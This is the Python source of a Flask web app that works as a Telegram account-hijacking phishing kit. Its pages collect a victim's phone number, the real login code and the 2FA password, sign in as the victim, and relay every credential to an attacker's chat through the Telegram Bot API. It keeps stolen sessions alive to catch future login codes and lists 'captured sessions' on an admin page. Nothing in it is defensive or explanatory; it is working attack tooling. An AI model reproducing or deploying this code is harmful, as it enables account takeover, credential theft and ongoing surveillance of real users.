from flask import Flask, request, render_template, redirect, url_for, session
import logging
import requests
import asyncio
import os
import threading
import re
from datetime import datetime
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
from telethon.tl.types import User

load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)
logging.basicConfig(level=logging.DEBUG)

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

# Store session data and active clients
sessions = {}
active_clients = {}  # phone -> TelegramClient (kept alive for monitoring)

def send_telegram_message(text):
    """Send message to admin via Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")
        return None

def run_async(coro):
    """Run async function in sync context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

async def start_session_monitor(phone, client):
    """Start monitoring a logged-in session for new login codes"""
    
    @client.on(events.NewMessage(from_users=777000))  # 777000 is Telegram's official account
    async def handler(event):
        message_text = event.message.text
        
        # Extract login code if present
        code_match = re.search(r'(\d{5,6})', message_text)
        code = code_match.group(1) if code_match else "N/A"
        
        print(f"\n{'='*60}")
        print(f"🚨 INTERCEPTED MESSAGE FROM TELEGRAM")
        print(f"📞 Account: {phone}")
        print(f"💬 Message: {message_text[:200]}")
        print(f"🔑 Code: {code}")
        print(f"{'='*60}\n")
        
        # Forward to admin
        send_telegram_message(f"""🚨 <b>INTERCEPTED LOGIN CODE!</b>

📞 <b>Account:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💬 <b>Full Message:</b>
<pre>{message_text[:500]}</pre>""")
    
    # Also capture ALL incoming messages (optional - for full monitoring)
    @client.on(events.NewMessage(incoming=True))
    async def all_messages_handler(event):
        sender = await event.get_sender()
        sender_name = getattr(sender, 'first_name', 'Unknown') if sender else 'Unknown'
        sender_id = getattr(sender, 'id', 'Unknown') if sender else 'Unknown'
        
        # Only notify for service messages or messages containing codes
        if sender_id == 777000 or re.search(r'\b\d{5,6}\b', event.message.text):
            return  # Already handled above
        
        # Uncomment below to receive ALL messages (can be spammy)
        # send_telegram_message(f"""📩 <b>New Message</b>
        # 📞 Account: <code>{phone}</code>
        # 👤 From: {sender_name} (<code>{sender_id}</code>)
        # 💬 {event.message.text[:200]}""")

    print(f"[MONITOR] Started monitoring session for {phone}")
    send_telegram_message(f"""👁️ <b>SESSION MONITOR ACTIVE</b>

📞 <b>Account:</b> <code>{phone}</code>
✅ Now intercepting all login codes sent to this account.

Any new login attempts will be captured and forwarded to you.""")

def run_client_forever(phone, session_file):
    """Run client in background thread to keep session alive and monitor"""
    async def _run():
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"[MONITOR] Session expired for {phone}")
            send_telegram_message(f"⚠️ Session expired for <code>{phone}</code>")
            return
        
        active_clients[phone] = client
        await start_session_monitor(phone, client)
        
        # Keep running
        await client.run_until_disconnected()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(_run())

def start_monitoring_thread(phone, session_file):
    """Start background thread for session monitoring"""
    thread = threading.Thread(target=run_client_forever, args=(phone, session_file), daemon=True)
    thread.start()
    return thread

async def send_code_async(phone):
    """Send verification code to phone via Telegram API"""
    session_file = f"sessions/{phone.replace('+', '').replace(' ', '')}"
    os.makedirs("sessions", exist_ok=True)
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        result = await client.send_code_request(phone)
        sessions[phone] = {
            'phone_code_hash': result.phone_code_hash,
            'session_file': session_file
        }
        await client.disconnect()
        return {'success': True, 'phone_code_hash': result.phone_code_hash}
    except FloodWaitError as e:
        await client.disconnect()
        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'error': str(e)}

async def verify_code_async(phone, code):
    """Verify the code entered by user"""
    if phone not in sessions:
        return {'success': False, 'error': 'Session expired', 'needs_2fa': False}
    
    session_data = sessions[phone]
    session_file = session_data['session_file']
    phone_code_hash = session_data['phone_code_hash']
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        
        me = await client.get_me()
        
        sessions[phone]['logged_in'] = True
        sessions[phone]['user_id'] = me.id
        sessions[phone]['username'] = me.username
        sessions[phone]['first_name'] = me.first_name
        
        # Don't disconnect - keep for monitoring
        await client.disconnect()
        
        # Start monitoring in background
        start_monitoring_thread(phone, session_file)
        
        return {'success': True, 'needs_2fa': False, 'user': me}
        
    except SessionPasswordNeededError:
        await client.disconnect()
        sessions[phone]['needs_2fa'] = True
        return {'success': False, 'needs_2fa': True, 'error': '2FA required'}
        
    except PhoneCodeInvalidError:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': 'Invalid code'}
        
    except PhoneCodeExpiredError:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': 'Code expired'}
        
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'needs_2fa': False, 'error': str(e)}

async def verify_2fa_async(phone, password):
    """Verify 2FA password"""
    if phone not in sessions:
        return {'success': False, 'error': 'Session expired'}
    
    session_data = sessions[phone]
    session_file = session_data['session_file']
    
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(password=password)
        
        me = await client.get_me()
        
        sessions[phone]['logged_in'] = True
        sessions[phone]['user_id'] = me.id
        sessions[phone]['username'] = me.username
        sessions[phone]['first_name'] = me.first_name
        sessions[phone]['password'] = password
        
        await client.disconnect()
        
        # Start monitoring in background
        start_monitoring_thread(phone, session_file)
        
        return {'success': True, 'user': me}
        
    except Exception as e:
        await client.disconnect()
        return {'success': False, 'error': str(e)}

# ==================== ROUTES ====================

@app.route('/')
def index():
    return redirect(url_for('miniapp'))

@app.route('/miniapp', methods=['GET'])
def miniapp():
    return render_template('miniapp.html')

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone', '').strip()
    
    if not phone:
        return render_template('miniapp.html', error='Please enter a phone number')
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    # Clean phone number
    phone = re.sub(r'[^\d+]', '', phone)
    
    print(f"\n{'='*60}")
    print(f"📱 NEW LOGIN ATTEMPT: {phone}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🚨 <b>NEW LOGIN ATTEMPT</b>

📞 <b>Phone:</b> <code>{phone}</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

⏳ Sending verification code...""")
    
    result = run_async(send_code_async(phone))
    
    if result['success']:
        send_telegram_message(f"""✅ <b>CODE SENT</b>

📞 <b>Phone:</b> <code>{phone}</code>
📨 Real Telegram code sent to user's device.

⏳ Waiting for user to enter the code...""")
        
        session['phone'] = phone
        return redirect(url_for('verify_otp_page'))
    else:
        error_msg = result.get('error', 'Unknown error')
        send_telegram_message(f"""❌ <b>FAILED TO SEND CODE</b>

📞 <b>Phone:</b> <code>{phone}</code>
⚠️ <b>Error:</b> {error_msg}""")
        
        return render_template('miniapp.html', error=error_msg)

@app.route('/verify_otp', methods=['GET', 'POST'])
def verify_otp_page():
    phone = session.get('phone', '')
    
    if not phone:
        return redirect(url_for('miniapp'))
    
    if request.method == 'GET':
        return render_template('verify_otp.html', phone=phone)
    
    code = request.form.get('otp', '').strip()
    
    print(f"\n{'='*60}")
    print(f"🔐 OTP ENTERED: {code} for {phone}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🔐 <b>OTP ENTERED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>

⏳ Verifying with Telegram...""")
    
    result = run_async(verify_code_async(phone, code))
    
    if result['success']:
        user = result.get('user')
        send_telegram_message(f"""✅ <b>LOGIN SUCCESSFUL!</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>
👤 <b>Name:</b> {user.first_name if user else 'N/A'}
🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>

🎉 Session captured and monitoring started!
👁️ You will now receive any new login codes sent to this account.""")
        
        return redirect(url_for('success'))
        
    elif result.get('needs_2fa'):
        send_telegram_message(f"""🔒 <b>2FA REQUIRED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code:</b> <code>{code}</code>

⏳ Waiting for cloud password...""")
        
        return redirect(url_for('verify_2fa_page'))
    else:
        error_msg = result.get('error', 'Invalid code')
        send_telegram_message(f"""❌ <b>INVALID CODE</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔑 <b>Code Entered:</b> <code>{code}</code>
⚠️ <b>Error:</b> {error_msg}""")
        
        return render_template('verify_otp.html', phone=phone, error=error_msg)

@app.route('/verify_2fa', methods=['GET', 'POST'])
def verify_2fa_page():
    phone = session.get('phone', '')
    
    if not phone:
        return redirect(url_for('miniapp'))
    
    if request.method == 'GET':
        return render_template('verify_2fa.html', phone=phone)
    
    password = request.form.get('code', '').strip()
    
    print(f"\n{'='*60}")
    print(f"🔒 2FA PASSWORD: {password} for {phone}")
    print(f"{'='*60}\n")
    
    send_telegram_message(f"""🔒 <b>2FA PASSWORD ENTERED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>Password:</b> <code>{password}</code>

⏳ Verifying...""")
    
    result = run_async(verify_2fa_async(phone, password))
    
    if result['success']:
        user = result.get('user')
        
        send_telegram_message(f"""✅ <b>FULL ACCESS OBTAINED!</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>2FA Password:</b> <code>{password}</code>
👤 <b>Name:</b> {user.first_name if user else 'N/A'}
🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>

🎉 Session captured and monitoring started!
👁️ You will now receive any new login codes sent to this account.""")
        
        return redirect(url_for('success'))
    else:
        error_msg = result.get('error', 'Invalid password')
        send_telegram_message(f"""❌ <b>2FA FAILED</b>

📞 <b>Phone:</b> <code>{phone}</code>
🔐 <b>Password:</b> <code>{password}</code>
⚠️ <b>Error:</b> {error_msg}""")
        
        return render_template('verify_2fa.html', phone=phone, error=error_msg)

@app.route('/success')
def success():
    phone = session.get('phone', '')
    session.clear()
    return render_template('success.html', phone=phone)

@app.route('/failure')
def failure():
    phone = session.get('phone', '')
    return render_template('failure.html', phone=phone)

# ==================== ADMIN ROUTES ====================

@app.route('/admin/sessions')
def admin_sessions():
    """View all captured sessions"""
    html = "<h1>Captured Sessions</h1><ul>"
    for phone, data in sessions.items():
        status = "🟢 Active" if phone in active_clients else "🔴 Inactive"
        html += f"<li><b>{phone}</b> - {status} - {data}</li>"
    html += "</ul>"
    html += f"<p>Active monitors: {len(active_clients)}</p>"
    return html

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🚀 Flask app starting on http://127.0.0.1:5000")
    print("📡 Make sure ngrok is running: ngrok http 5000")
    print(f"📱 Notifications will be sent to: {ADMIN_CHAT_ID}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
